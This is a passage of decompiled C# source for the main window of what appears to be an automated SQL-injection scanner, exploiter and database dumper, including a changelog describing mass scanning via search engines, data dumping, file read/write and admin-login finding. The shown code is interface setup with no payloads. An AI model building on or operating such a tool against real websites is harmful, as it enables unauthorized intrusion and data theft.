					pnlNotepad.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 9);
					pnlSettings.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 10);
					pnlSettingsAdvanced.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 11);
					pnlStatistics.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 12);
					pnlAbout.Tag = Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 13);
					Panel panel = new Panel();
					UxTabControl uxTabControl = new UxTabControl();
					panel.Dock = DockStyle.Fill;
					uxTabControl.Dock = DockStyle.Fill;
					panel.Controls.Add(uxTabControl);
					panel.Name = Guid.NewGuid().ToString();
					uxTabControl.Name = Guid.NewGuid().ToString();
					uxTabControl_1 = uxTabControl;
					uxTabControl_1.ImageList = imlTree;
					uxTabControl_1.SelectedIndexChanged += uxTabControl_1_SelectedIndexChanged;
					TabPage tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 10));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlSettings);
					pnlSettings.Dock = DockStyle.Fill;
					pnlSettings.Visible = true;
					tabPage.ImageIndex = 16;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 11));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlSettingsAdvanced);
					pnlSettingsAdvanced.Dock = DockStyle.Fill;
					pnlSettingsAdvanced.Visible = true;
					tabPage.ImageIndex = 11;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 12));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlStatistics);
					pnlStatistics.Dock = DockStyle.Fill;
					pnlStatistics.Visible = true;
					tabPage.ImageIndex = 12;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 13));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlAbout);
					pnlAbout.Dock = DockStyle.Fill;
					pnlAbout.Visible = true;
					tabPage.ImageIndex = 13;
					tabControlExt.TabPages.Add(panel, Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 10), (Bitmap)imlTree.Images[10]).CloseButtonVisible = false;
					panel = new Panel();
					uxTabControl = new UxTabControl();
					panel.Dock = DockStyle.Fill;
					uxTabControl.Dock = DockStyle.Fill;
					panel.Controls.Add(uxTabControl);
					panel.Name = Guid.NewGuid().ToString();
					uxTabControl.Name = Guid.NewGuid().ToString();
					uxTabControl.ImageList = imlTree;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 8));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlLoginFinder);
					pnlLoginFinder.Dock = DockStyle.Fill;
					pnlLoginFinder.Visible = true;
					tabPage.ImageIndex = 8;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 18));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlTools);
					pnlTools.Dock = DockStyle.Fill;
					pnlTools.Visible = true;
					tabPage.ImageIndex = 15;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 9));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlNotepad);
					pnlNotepad.Dock = DockStyle.Fill;
					pnlNotepad.Visible = true;
					tabPage.ImageIndex = 9;
					tabControlExt.TabPages.Add(panel, Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 7), (Bitmap)imlTree.Images[7]).CloseButtonVisible = false;
					tabControlExt.TabPages.Add(pnlSockList, Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 6), (Bitmap)imlTree.Images[6]).CloseButtonVisible = false;
					tabControlExt.TabPages.Add(pnlSQLiDumper, Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 3), (Bitmap)imlTree.Images[3]).CloseButtonVisible = false;
					tabControlExt.TabPages.Add(pnlAnalizer, Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 15), (Bitmap)imlTree.Images[4]).CloseButtonVisible = false;
					panel = new Panel();
					uxTabControl = new UxTabControl();
					panel.Dock = DockStyle.Fill;
					uxTabControl.Dock = DockStyle.Fill;
					panel.Controls.Add(uxTabControl);
					panel.Name = Guid.NewGuid().ToString();
					uxTabControl.Name = Guid.NewGuid().ToString();
					uxTabControl_0 = uxTabControl;
					uxTabControl_0.Alignment = TabAlignment.Bottom;
					uxTabControl_0.ImageList = imlTree;
					uxTabControl_0.SelectedIndexChanged += uxTabControl_0_SelectedIndexChanged;
					pnlScanner.Controls.Remove(grbScannerURL);
					pnlScanner.Controls.Add(dtgQueue);
					pnlScanner.Controls.Add(tsSearchFilter);
					tsSearchFilter.BringToFront();
					dtgQueue.BringToFront();
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 14));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlScanner);
					pnlScanner.Dock = DockStyle.Fill;
					pnlScanner.Visible = true;
					tabPage.ImageIndex = 0;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 1));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlSQLi);
					pnlSQLi.Dock = DockStyle.Fill;
					pnlSQLi.Visible = true;
					tabPage.ImageIndex = 1;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 4));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlExploiter);
					pnlExploiter.Dock = DockStyle.Fill;
					pnlExploiter.Visible = true;
					tabPage.ImageIndex = 4;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 2));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlSQLiNoInjectable);
					pnlSQLiNoInjectable.Dock = DockStyle.Fill;
					pnlSQLiNoInjectable.Visible = true;
					tabPage.ImageIndex = 2;
					tabPage = new TabPage(Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 5));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(pnlTrash);
					pnlTrash.Dock = DockStyle.Fill;
					pnlTrash.Visible = true;
					tabPage.ImageIndex = 5;
					tabControlExt.TabPages.Add(panel, Globals.translate_0.GetStr(base.Name + "." + twMain.Name, 17), (Bitmap)imlTree.Images[14]).CloseButtonVisible = false;
					foreach (TabPageExt tabPage2 in tabControlExt.TabPages)
					{
						tabPage2.IconVisible = true;
					}
					tabControlExt.TabGlassGradient = false;
					tabControlExt.TabBorderEnhanced = true;
					tabControlExt.Enabled = true;
					tabControlExt.SmoothingMode = SmoothingMode.HighQuality;
					tabControlExt.DropButtonVisible = false;
					tabControlExt.AllowTabReorder = false;
					tabControlExt.HotTrack = true;
					tabControlExt.SelectItem(tabControlExt.TabPages[0]);
					tabControlExt.TabHeight -= 5;
					tabControlExt.BringToFront();
					tabControlExt = null;
					VisualStyler.EnableCustomPaint((Control)mdiTabControl, true);
					VisualStyler.EnableCustomBackgroundPaint((Control)mdiTabControl, true);
					MinimumSize = new Size(680, 450);
				}
				toolStripLabel_1 = new ToolStripLabel(Globals.translate_0.GetStr(this, 102));
				mnuLWAutoScroll.Text = Globals.translate_0.GetStr(this, 63);
				ToolStripControl toolStripControl = new ToolStripControl(numThreads);
				toolStripControl.Alignment = ToolStripItemAlignment.Right;
				tsWorker.Items.Add(toolStripControl);
				toolStripLabel_1.Alignment = ToolStripItemAlignment.Right;
				tsWorker.Items.Add(toolStripLabel_1);
				numSearchColumnThreads.Maximum = 200m;
				toolStripControl = new ToolStripControl(numSearchColumnThreads);
				tsSearchColumn.Items.Add(toolStripControl);
				btnPause.Visible = false;
				btnPauseSP.Visible = false;
				btnStop.Visible = false;
				mnuAboutHWID.Visible = false;
				Globals.SetFlatBorder(lblAdvanced);
				Globals.SetFlatBorder(pnlAbout);
				toolStripButton_4.Alignment = ToolStripItemAlignment.Left;
				toolStripButton_4.CheckOnClick = true;
				toolStripButton_4.Text = Globals.translate_0.GetStr(this, 31);
				toolStripButton_4.Image = Class6.DynamicMenu_16x_24;
				toolStripButton_4.ImageTransparentColor = Color.Fuchsia;
				toolStripButton_4.CheckedChanged += toolStripButton_4_CheckedChanged;
				stMain.Items.Add(toolStripButton_4);
				int num;
				unchecked
				{
					foreach (object value in Enum.GetValues(typeof(Globals.SearchHost)))
					{
						Globals.SearchHost searchHost = (Globals.SearchHost)Conversions.ToByte(value);
						lstSearchEngine.Items.Add(searchHost, isChecked: true);
						ListViewItem listViewItem = new ListViewItem(searchHost.ToString());
						listViewItem.SubItems.Add("com");
						listViewItem.Tag = searchHost;
						lvwScannerDomain.Items.Add(listViewItem);
					}
					cmbSearchColumnType.Items.Add(Globals.translate_0.GetStr(this, 8).Replace(":", ""));
					cmbSearchColumnType.Items.Add(Globals.translate_0.GetStr(this, 9).Replace(":", ""));
					cmbSearchColumnType.SelectedIndex = 0;
					foreach (object value2 in Enum.GetValues(typeof(ExploitType)))
					{
						ExploitType exploitType = (ExploitType)Conversions.ToInteger(value2);
						if (exploitType != 0 && exploitType != ExploitType.RFI)
						{
							lstExpoitType.Items.Add(exploitType, isChecked: false);
						}
						else
						{
							lstExpoitType.Items.Add(exploitType, isChecked: true);
						}
					}
					foreach (DataGridViewColumn column in dtgSQLi.Columns)
					{
						if (!string.IsNullOrEmpty(column.HeaderText))
						{
							cmbSQLiSearch.Items.Add(column.HeaderText);
						}
					}
					cmbSQLiSearch.SelectedIndex = 0;
					foreach (DataGridViewColumn column2 in dtgSQLiNoInjectable.Columns)
					{
						if (!string.IsNullOrEmpty(column2.HeaderText))
						{
							cmbSQLiNoInjectableSearch.Items.Add(column2.HeaderText);
						}
					}
					cmbSQLiNoInjectableSearch.SelectedIndex = 0;
					foreach (DataGridViewColumn column3 in dtgFileInclusao.Columns)
					{
						if (!string.IsNullOrEmpty(column3.HeaderText))
						{
							cmbFileInclusaoSearch.Items.Add(column3.HeaderText);
						}
					}
					cmbFileInclusaoSearch.SelectedIndex = 0;
					num = 0;
				}
				do
				{
					string str = Globals.translate_0.GetStr(this, Conversions.ToInteger((126 + num).ToString()));
					cmbSQLiFilter.Items.Add(str);
					cmbSQLiNoInjectableFilter.Items.Add(str);
					cmbFileInclusaoFilter.Items.Add(str);
					num++;
				}
				while (num <= 6);
				cmbSQLiFilter.SelectedIndex = 2;
				cmbSQLiNoInjectableFilter.SelectedIndex = 2;
				cmbFileInclusaoFilter.SelectedIndex = 2;
				char[] array = "abcdefghijklmnopqrstuvwxyz".ToUpper().ToCharArray();
				foreach (char c in array)
				{
					cmbGUIHotKey.Items.Add(c);
				}
				cmbGUIHotKey.DropDownStyle = ComboBoxStyle.DropDownList;
				cmbGUIHotKey.SelectedIndex = 0;
				cmbSQLChar.Items.Add("Char");
				cmbSQLChar.Items.Add("Chr");
				cmbSQLChar.SelectedIndex = 0;
				cmbUpdater.Items.Add(Globals.translate_0.GetStr(this, 33));
				cmbUpdater.Items.Add(Globals.translate_0.GetStr(this, 34));
				cmbUpdater.Items.Add(Globals.translate_0.GetStr(this, 35));
				cmbUpdater.SelectedIndex = 1;
			}
			lblSQLi.Text = "";
			lblSQLiNoInjectable.Text = "";
			lblFileInclusao.Text = "";
			lblSocksCount.Text = "";
			lblDownloads.Text = "";
			mnuHttpLogAutoScroll.Checked = true;
			toolStripButton_3.Alignment = ToolStripItemAlignment.Right;
			toolStripButton_3.CheckOnClick = true;
			toolStripButton_3.Text = Globals.translate_0.GetStr(this, 32);
			toolStripButton_3.Checked = false;
			toolStripButton_3.Image = Class6.StepIntoArrow_16x_24;
			toolStripButton_3.ImageTransparentColor = Color.Fuchsia;
			toolStripButton_3.CheckedChanged += toolStripButton_3_CheckedChanged;
			stMain.Items.Add(toolStripButton_3);
			stMain.Items.Remove(lblIP);
			stMain.Items.Add(lblIP);
			grbHttpLog.Visible = false;
			grbHTTPExploit.Height = 130;
			grbHttpLog.Height = 115;
			List<string> list = new List<string>();
			string[] manifestResourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
			foreach (string text in manifestResourceNames)
			{
				if (text.EndsWith(".bin"))
				{
					list.Add(text.Replace(".bin", ""));
				}
			}
			list.Sort();
			cmbSkin.Items.AddRange(list.ToArray());
			cmbSkin.Text = Class50.smethod_5(base.Name, cmbSkin.Name, "OSX Itunes");
			if (string.IsNullOrEmpty(cmbSkin.Text))
			{
				cmbSkin.SelectedIndex = 15;
			}
			VisualStyler.ExcludeControlType(typeof(ContextMenuStrip));
			Globals.AddMouseMoveForm(this);
			Class54.smethod_0();
		}
	}

	private void method_64()
	{
		timer_0 = new System.Timers.Timer(300000.0);
		timer_0.Elapsed += timer_0_Elapsed;
		timer_0.AutoReset = true;
		timer_0.Start();
		timer_1 = new System.Timers.Timer(1000.0);
		timer_1.Elapsed += timer_1_Elapsed;
		timer_1.AutoReset = true;
		timer_1.Start();
		timer_1_Elapsed(null, null);
	}

	private void method_65()
	{
		if (timer_1 != null)
		{
			timer_1.Stop();
		}
		if (timer_0 != null)
		{
			timer_0.Stop();
		}
	}

	private void timer_0_Elapsed(object sender, EventArgs e)
	{
		method_72();
	}

	private string method_66(int int_14)
	{
		if (int_14 == 0)
		{
			return "";
		}
		return (int_14 > 1000000) ? (Conversions.ToString(Math.Round((double)int_14 / 1000000.0, 2)) + "m") : ((int_14 <= 1000) ? int_14.ToString() : (Conversions.ToString(Math.Round((double)int_14 / 1000.0, 1)) + "k"));
	}

	private void toolStripButton_4_CheckedChanged(object sender, EventArgs e)
	{
		Globals.LockWindowUpdate(base.Handle);
		pnlTree.Visible = !((ToolStripButton)sender).Checked;
		if (pnlTree.Visible | (twMain.SelectedNode == null))
		{
			Text = Globals.APP_VERSION;
		}
		else
		{
			Text = Globals.APP_VERSION + " [" + twMain.SelectedNode.Text.ToUpper() + "]";
		}
		Globals.LockWindowUpdate(IntPtr.Zero);
	}

	private static void SetDoubleBuffered(Control control)
	{
		typeof(Control).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, control, new object[1] { true });
	}

	private void method_67()
	{
		if (toolStripButton_3.Checked)
		{
			toolStripButton_3.Checked = false;
		}
		scrollingBox_0 = new ScrollingBox();
		scrollingBox_0.BackColor = Color.Black;
		scrollingBox_0.Alignment = StringAlignment.Center;
		scrollingBox_0.ForeColor = Color.Green;
		scrollingBox_0.Font = new Font("Courier New", 14f, FontStyle.Bold, GraphicsUnit.Point, 0);
		scrollingBox_0.Items.Add(" ");
		scrollingBox_0.Items.Add(" ");
		scrollingBox_0.Items.Add("AngelSecurityTeam");
		scrollingBox_0.Items.Add("https://github.com/AngelSecurityTeam");
		scrollingBox_0.Items.Add("");
		scrollingBox_0.Items.Add("");
		scrollingBox_0.ContextMenuStrip = mnuAbout;
		scrollingBox_0.ScrollEnabled = true;
		pnlAbout.Controls.Add(scrollingBox_0);
		scrollingBox_0.Dock = DockStyle.Fill;
		scrollingBox_0.MouseDown += Globals.AddMouseMove;
	}

	private void method_68()
	{
		if (scrollingBox_0 != null)
		{
			pnlAbout.Controls.Remove(scrollingBox_0);
			scrollingBox_0.Dispose();
		}
		stMain.Enabled = true;
	}

	private void method_69(object sender, EventArgs e)
	{
		method_72();
		DumperForm.method_74();
		method_1(Globals.translate_0.GetStr(this, 48));
		Interaction.Beep();
	}

	private void method_70(object sender, EventArgs e)
	{
		method_73();
		DumperForm.method_75();
		method_1(Globals.translate_0.GetStr(this, 49));
		Interaction.Beep();
	}

	private void method_71(object sender, EventArgs e)
	{
		using (new Class8(this))
		{
			if (MessageBox.Show(Globals.translate_0.GetStr(this, 50) + "\r\n\r\n" + Globals.translate_0.GetStr(this, 51), Text, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
			{
				return;
			}
		}
		if (File.Exists(Globals.XML_PATH))
		{
			File.Delete(Globals.XML_PATH);
		}
		bool_0 = true;
		Application.Restart();
	}

	private void method_72()
	{
		if (base.InvokeRequired)
		{
			Invoke((EventHandler)([SpecialName] [DebuggerHidden] (object sender, EventArgs e) =>
			{
				method_72();
			}));
			return;
		}
		if (Globals.IS_DUMP_INSTANCE)
		{
			Class50.smethod_4(base.Name, btnSocksMyIP.Name, btnSocksMyIP.Checked.ToString());
			Globals.G_SOCKS.method_15();
			return;
		}
		foreach (ListViewItem item in lvwScannerDomain.Items)
		{
			Class50.smethod_4(base.Name, item.Text + ".Domain", item.SubItems[1].Text);
		}
		if (!bool_3)
		{
		}
		Class50.smethod_4(base.Name, "ThreadsScanner", Conversions.ToString(int_3));
		Class50.smethod_4(base.Name, "ThreadsExploit", Conversions.ToString(int_2));
		Class50.smethod_4(base.Name, numSearchColumnThreads.Name, Conversions.ToString(numSearchColumnThreads.Value));
		Class50.smethod_4(base.Name, cmbSearchColumnType.Name, Conversions.ToString(cmbSearchColumnType.SelectedIndex));
		Class50.smethod_4(base.Name, cmbSQLiSearch.Name, cmbSQLiSearch.Text);
		Class50.smethod_4(base.Name, cmbSQLiNoInjectableSearch.Name, Conversions.ToString(cmbSQLiNoInjectableSearch.SelectedIndex));
		Class50.smethod_4(base.Name, cmbFileInclusaoSearch.Name, Conversions.ToString(cmbFileInclusaoSearch.SelectedIndex));
		Class50.smethod_4(base.Name, txtSQLiSearch.Name, txtSQLiSearch.Text);
		Class50.smethod_4(base.Name, txtSQLiNoInjectableSearch.Name, txtSQLiNoInjectableSearch.Text);
		Class50.smethod_4(base.Name, txtFileInclusaoSearch.Name, txtFileInclusaoSearch.Text);
		Class50.smethod_4(base.Name, btnSocksMyIP.Name, btnSocksMyIP.Checked.ToString());
		Class50.smethod_4(base.Name, cmbLanguages.Name, cmbLanguages.Text);
		Class50.smethod_4(base.Name, cmbSearchColumn.Name, cmbSearchColumn.Text);
		Class50.smethod_4(base.Name, cmbSearchColumn2.Name, cmbSearchColumn2.Text);
		Class50.smethod_4(base.Name, cmbSearchColumn3.Name, cmbSearchColumn3.Text);
		Class50.smethod_4(base.Name, cmbSearchColumn4.Name, cmbSearchColumn4.Text);
		Class50.smethod_4(base.Name, chkSearchColumn.Name, chkSearchColumn.Checked.ToString());
		Class50.smethod_4(base.Name, chkSearchColumn2.Name, chkSearchColumn2.Checked.ToString());
		Class50.smethod_4(base.Name, chkSearchColumn3.Name, chkSearchColumn3.Checked.ToString());
		Class50.smethod_4(base.Name, chkSearchColumn4.Name, chkSearchColumn4.Checked.ToString());
		Globals.GStatistics.method_0();
		method_77(lstSearchEngine);
		method_77(lstExpoitType);
		method_77(lstAnalizerUnion);
		method_77(lstAnalizerError);
		method_79(lvwLFIpathLinux);
		method_79(lvwLFIpathWin);
		method_79(lvwWafs);
		method_79(lvwXSS);
		method_81(lstExcludeUrlWords);
		Globals.G_SOCKS.method_15();
		Class50.smethod_3(this);
		Class50.smethod_1();
		Globals.DG_SQLi.method_11();
		Globals.DG_SQLiNoInjectable.method_11();
		Globals.DG_FileInclusao.method_11();
		Globals.GQueue.method_11();
		Globals.GTrash.method_6();
	}

	private void method_73()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		ListViewItem listViewItem = default(ListViewItem);
		IEnumerator enumerator = default(IEnumerator);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					if (base.InvokeRequired)
					{
						goto IL_000c;
					}
					goto IL_0026;
				case 1883:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000c;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003b;
						case 7:
							goto IL_0069;
						case 9:
						case 10:
							goto IL_0075;
						case 11:
							goto IL_0097;
						case 12:
							goto IL_00cc;
						case 13:
							goto IL_00d7;
						case 14:
							goto IL_00ed;
						case 15:
							goto IL_00fc;
						case 16:
							goto IL_010b;
						case 17:
							goto IL_011a;
						case 18:
							goto IL_0129;
						case 19:
							goto IL_0138;
						case 20:
							goto IL_0147;
						case 21:
							goto IL_0156;
						case 22:
							goto IL_0165;
						case 23:
							goto IL_0174;
						case 24:
							goto IL_0198;
						case 25:
							goto IL_01a6;
						case 26:
							goto IL_01b9;
						case 27:
							goto IL_01dd;
						case 28:
							goto IL_01eb;
						case 29:
							goto IL_01fe;
						case 30:
							goto IL_0222;
						case 31:
							goto IL_0230;
						case 32:
							goto IL_0243;
						case 33:
							goto IL_0253;
						case 34:
							goto IL_0263;
						case 35:
							goto IL_0273;
						case 36:
							goto IL_027b;
						case 37:
							goto IL_029f;
						case 38:
							goto IL_02c3;
						case 39:
							goto IL_02f7;
						case 40:
							goto IL_0326;
						case 41:
							goto IL_035a;
						case 42:
							goto IL_0389;
						case 43:
							goto IL_03b8;
						case 44:
							goto IL_03e2;
						case 45:
							goto IL_040c;
						case 46:
							goto IL_0436;
						case 47:
							goto IL_0460;
						case 48:
							goto IL_048a;
						case 49:
							goto IL_04b4;
						case 50:
							goto IL_04de;
						case 51:
							goto IL_050d;
						case 52:
							goto IL_053c;
						case 53:
							goto IL_056b;
						case 54:
							goto IL_059a;
						case 55:
							goto IL_05a5;
						case 56:
							goto IL_05b0;
						case 57:
							goto IL_05bb;
						case 58:
							goto IL_05c6;
						case 59:
							goto IL_05cd;
						case 60:
							goto IL_05da;
						case 61:
							goto IL_05e7;
						case 62:
							goto IL_05f4;
						case 63:
							goto IL_0601;
						case 64:
							goto IL_0616;
						case 65:
						case 66:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
						case 8:
						case 67:
						case 68:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0601:
					num = 63;
					if (!string.IsNullOrEmpty(txtNotepad.Text))
					{
						break;
					}
					goto IL_0616;
					IL_0616:
					num = 64;
					txtNotepad.Text = "Version History\r\n\r\n01/06/2020 - v.10.1\r\n* Improved CPU/RAM usage, updated HTTP/Threads engine for low system use\r\n* Misc: improvements, fixes and optimizations\r\n\r\n11/27/2019 - v.10.0\r\n* Added Dumper MySQL Error Split Rows Dumping w/single column\r\n* Added Dumper search column\r\n* Improved Dumper auto setup collocations\r\n* Fixed Dumper Oracle Convert strings to chars\r\n* Improved Search Columns, supports up to 200x threads\r\n* Improved Search Columns now works w/ Oracle and PostgreSQL\r\n* Fixed Scanner yandex, replaced Ixquick to StartPage\r\n* Misc Removed Auto update and xml import from 8.x\r\n* Misc Optimized App closing (faster, even if running threads)\r\n* Misc Fix save settings at app closing (fails in some cases)\r\n* Misc Added Show external IP on statusbar\r\n* Misc Added French Language\r\n\r\n03/10/2019 - v.9.9\r\n* Added new Analyzer form\r\n* Added new GUI Style with TABS (Settings to change)\r\n* Added Dumper form option for credentials (login/pwd)\r\n* Fixed Exploiter RFI bug, now works perfectly\r\n* Improved Core loading speed\r\n* Improved deleting url slow (All girds, more aftected Poxies)\r\n* Improved stop threads (more faster)\r\n* Improved url box (back colors)\r\n* Improved context menus minor glitches\r\n* Improved thread engine now support up to 300x threads\r\n* Improved toolbars icons and tab control\r\n* Improved transations in missing controls\r\n\r\n02/25/2019 - v.9.8\r\n* Update search engine (works all again)\r\n* Fixed search engine stop threads when done\r\n* Improved CPU usage when exploiting\r\n* Improved GUI, no flick anymore, new country flags,\r\n  2 new skins, better toolbars icons, etc\r\n* Add load proxies from URL\r\n* Fixed Windows Servers crashes\r\n* Improved LFI \\ RFI \\ XXS exploiter\r\n\r\n02/16/2018 - v.9.7\r\n* Added Auto disable scanner blacklist IP\r\n* Fixed Scanner URL parser\r\n* Improved Exploiter, better detection rate\r\n* Misc: improvements, fixes and optimizations\r\n\r\n09/15/2017 - v.9.6\r\n* Added Grids Filters by date\r\n* Fixed Dumper data parser (for some MySQL Error injections)\r\n* Misc: improvements, fixes and optimizations\r\n\r\n09/01/2017 - v.9.5\r\n* Fix MySQL Load\\Write File for MySQL v.4.x (Data Dumper)\r\n* Fix Stop Work 'Search Column\\Table' MSG Box Error\r\n* Improved Search column sort\r\n* Improved Search Grids freezing\r\n* Improved ContextMenu poor visibility\r\n* Add Grids Key Control \r\n  CTRL + A to select All\r\n  Delete key to delete selected items\r\n  Enter key to go to dumper\r\n\r\n08/26/2017 - v.9.4\r\n* Added Germany, Portuguese and Persian Language\r\n* Added Import menu (queue)\r\n* Added Re-Exploiter menu\r\n* Improved Exploiter, better detection rate\r\n* Improved Data Dump, problem with '?~!' in MySQL Error Basead\r\n* Improved Scanner, IP/Proxy control with blacklisted\r\n* Improved Search Column\\Tables\r\n* Improved Dumper Auto-Setup (detecting HTTP Flow Redirects)\r\n\r\n08/12/2017 - v.9.3\r\n* Added XXS support\r\n* Added Import URL Injectables.xml from v.8.x\r\n* Added extra 3 column (search rows)\r\n* Added Exploit from .txt (press Start Exploiter with queue empty)\r\n* Added Statistics Virtualization\r\n* Improved exploiter engine\r\n* Improved analyzer engine\r\n  ~40% better detection\r\n  fixed unique filter by domain\r\n  fixed loadfile bug dection\r\n* Improved Dumper for long time dumping (no more slow, only if request delays)\r\n* Improved RAM\\CPU and Traffic use\r\n* Improved multi thread engine stop\r\n* Improved HTTP Debbuger, better delay control\r\n* Improved GUI Core Load\\UnLoad performance\r\n* Improved Skins (added news, removed some)\r\n* Fixed grids auto scroll\r\n* Fixed open new instancie bug on schema\r\n\r\n04/04/2017 - v.9.2\r\n* New: Admin Login Finder\r\n* New: Full translation support\r\n* New: Complete XML Russian language\r\n* Updated: Dumper Form, fixe crash when dump in some cases\r\n* Fixed: MySQL Error Collocations\r\n* Misc: improvements, fixes and optimizations\r\n\r\n03/17/2017 - v.9.1\r\n* Improved: SQL Injection Exploiter\r\n* New: MySQL Load\\Write (bruting path and checking on user_privileges table)\r\n* New: Check Alexa Rank, context menu on Grid (SQLi, File Inclusao)\r\n* Updated: Dumper Form, improvements, fixes and optimizations\r\n* Fixed: Bug on statistic cause crashe after x.x Gb\r\n* Misc: improvements, fixes and optimizations on Main Core\r\n\r\n03/01/2017 - v.9.0\r\n* Initial release";
					break;
					IL_05f4:
					num = 62;
					Globals.GTrash.method_5();
					goto IL_0601;
					IL_0097:
					num = 11;
					listViewItem.SubItems[1].Text = Class50.smethod_5(base.Name, listViewItem.Text + ".Domain", "com");
					goto IL_00cc;
					IL_000c:
					num = 2;
					Invoke((EventHandler)([SpecialName] [DebuggerHidden] (object sender, EventArgs e) =>
					{
						method_72();
					}));
					goto end_IL_0001_3;
					IL_0026:
					num = 4;
					Class50.smethod_2(this);
					goto IL_002f;
					IL_002f:
					num = 5;
					Globals.G_SOCKS.method_16();
					goto IL_003b;
					IL_003b:
					num = 6;
					btnSocksMyIP.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, btnSocksMyIP.Name, "False"));
					goto IL_0069;
					IL_0069:
					num = 7;
					if (Globals.IS_DUMP_INSTANCE)
					{
						goto end_IL_0001_3;
					}
					goto IL_0075;
					IL_0075:
					num = 10;
					enumerator = lvwScannerDomain.Items.GetEnumerator();
					goto IL_00cf;
					IL_00cf:
					if (enumerator.MoveNext())
					{
						listViewItem = (ListViewItem)enumerator.Current;
						goto IL_0097;
					}
					goto IL_00d7;
					IL_00d7:
					num = 13;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto IL_00ed;
					IL_00cc:
					num = 12;
					goto IL_00cf;
					IL_00ed:
					num = 14;
					method_76(lstSearchEngine);
					goto IL_00fc;
					IL_00fc:
					num = 15;
					method_76(lstExpoitType);
					goto IL_010b;
					IL_010b:
					num = 16;
					method_76(lstAnalizerUnion);
					goto IL_011a;
					IL_011a:
					num = 17;
					method_76(lstAnalizerError);
					goto IL_0129;
					IL_0129:
					num = 18;
					method_78(lvwLFIpathLinux);
					goto IL_0138;
					IL_0138:
					num = 19;
					method_78(lvwLFIpathWin);
					goto IL_0147;
					IL_0147:
					num = 20;
					method_78(lvwWafs);
					goto IL_0156;
					IL_0156:
					num = 21;
					method_78(lvwXSS);
					goto IL_0165;
					IL_0165:
					num = 22;
					method_80(lstExcludeUrlWords);
					goto IL_0174;
					IL_0174:
					num = 23;
					Globals.DG_SQLi = new Class29(dtgSQLi, Globals.TXT_PATH + "SQLi.txt", 4, 6);
					goto IL_0198;
					IL_0198:
					num = 24;
					Globals.DG_SQLi.method_12(bool_1: false);
					goto IL_01a6;
					IL_01a6:
					num = 25;
					dtgSQLi.Tag = Globals.DG_SQLi;
					goto IL_01b9;
					IL_01b9:
					num = 26;
					Globals.DG_SQLiNoInjectable = new Class29(dtgSQLiNoInjectable, Globals.TXT_PATH + "SQLiNoInjectable.txt", 2, 3);
					goto IL_01dd;
					IL_01dd:
					num = 27;
					Globals.DG_SQLiNoInjectable.method_12(bool_1: false);
					goto IL_01eb;
					IL_01eb:
					num = 28;
					dtgSQLiNoInjectable.Tag = Globals.DG_SQLiNoInjectable;
